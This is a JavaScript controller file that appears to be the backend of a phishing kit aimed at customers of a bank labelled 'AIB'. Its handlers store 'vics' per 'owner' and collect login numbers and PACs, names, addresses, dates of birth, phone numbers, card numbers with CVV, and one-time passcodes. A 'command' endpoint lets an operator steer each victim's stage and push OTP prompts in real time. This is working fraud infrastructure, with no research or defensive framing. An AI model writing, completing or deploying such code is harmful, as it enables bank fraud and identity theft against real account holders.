const AIB = require("../models/aibModel");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  AIB.find({ owner }).exec((err, vics) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vics);
  });
};

const command = async (req, res) => {
  const { uniqueid, status, otpText } = req.body;
  try {
    if (otpText) {
      await AIB.findOneAndUpdate({ uniqueid }, { status, otpText }).exec();
    } else {
      await AIB.findOneAndUpdate({ uniqueid }, { status }).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  AIB.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { regnumber, pac, uniqueid, owner, ip } = req.body;
  try {
    await AIB.create({ uniqueid, regnumber, pac, status: 1, owner, ip });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { regnumber, pac, uniqueid } = req.body;
  try {
    await AIB.findOneAndUpdate(
      { uniqueid },
      { regnumber, pac, status: 10 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPersonal = async (req, res) => {
  const { fullname, address, pcode, dob, telephone, uniqueid } = req.body;
  try {
    await AIB.findOneAndUpdate(
      { uniqueid },
      { fullname, address, pcode, dob, telephone, status: 3 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitCard = async (req, res) => {
  const { ccnum, ccexp, cvv, uniqueid } = req.body;
  try {
    await AIB.findOneAndUpdate(
      { uniqueid },
      { ccnum, ccexp, cvv, status: 5 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await AIB.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitMisc = async (req, res) => {
  const { cardNumber, branchAddy, uniqueid } = req.body;
  try {
    await AIB.findOneAndUpdate(
      { uniqueid },
      { cardNumber, branchAddy, status: 9 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitPersonal,
  submitCard,
  submitOtp,
  submitMisc,
};
